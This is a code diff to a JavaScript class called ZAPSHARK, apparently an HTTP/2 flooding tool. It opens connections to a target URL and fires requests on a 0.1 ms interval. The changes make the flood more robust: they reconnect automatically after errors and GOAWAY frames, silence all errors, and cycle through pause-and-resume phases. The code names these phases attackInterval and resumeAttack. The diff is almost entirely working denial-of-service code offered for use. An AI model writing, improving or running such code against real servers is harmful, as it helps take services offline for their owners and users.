@@ -15,20 +15,39 @@ class ZAPSHARK {
         
         // Maintenance
         this.lastMaintenance = Date.now();
-        this.maintenanceInterval = 3600000; // 1 hour
-        this.maintenanceDuration = 600000;  // 10 minutes
+        this.maintenanceInterval = 3600000;
+        this.maintenanceDuration = 600000;
         
         this.client = null;
         this.attackInterval = null;
     }
 
     async setupClient() {
-        this.client = http2.connect(this.targetUrl);
-        this.client.on('error', (err) => {});
+        try {
+            this.client = http2.connect(this.targetUrl);
+            
+            // SILENCE ALL ERRORS
+            this.client.on('error', () => {
+                this.client = null;
+                setTimeout(() => this.setupClient(), 100);
+            });
+            
+            this.client.on('goaway', () => {
+                this.client = null;
+                setTimeout(() => this.setupClient(), 100);
+            });
+            
+        } catch (err) {
+            this.client = null;
+            setTimeout(() => this.setupClient(), 100);
+        }
     }
 
     sendRequest() {
-        if (!this.client) return;
+        if (!this.client) {
+            this.setupClient();
+            return;
+        }
 
         try {
             const req = this.client.request({
@@ -36,6 +55,8 @@ class ZAPSHARK {
                 ':path': '/'
             });
             
+            // SILENCE STREAM ERRORS
+            req.on('error', () => {});
             req.on('response', () => {
                 req.destroy();
             });
@@ -43,7 +64,7 @@ class ZAPSHARK {
             req.end();
             
         } catch (err) {
-            // Silent fail
+            // SILENT FAIL
         } finally {
             this.totalRequests++;
             this.requestsSinceLastCalc++;
@@ -91,8 +112,9 @@ class ZAPSHARK {
     flushSockets() {
         if (this.client) {
             this.client.destroy();
-            this.setupClient();
+            this.client = null;
         }
+        setTimeout(() => this.setupClient(), 100);
     }
 
     checkMaintenance() {
@@ -105,12 +127,10 @@ class ZAPSHARK {
             this.flushDNS();
             this.flushSockets();
             
-            // Clear attack interval
             if (this.attackInterval) {
                 clearInterval(this.attackInterval);
             }
             
-            // Resume after 10 minutes
             setTimeout(() => {
                 this.resumeAttack();
             }, this.maintenanceDuration);
@@ -134,7 +154,7 @@ class ZAPSHARK {
                 this.sendRequest();
                 this.updateDisplay();
             }
-        }, 0.1); // Same interval but double requests
+        }, 0.1);
     }
 
     async start() {
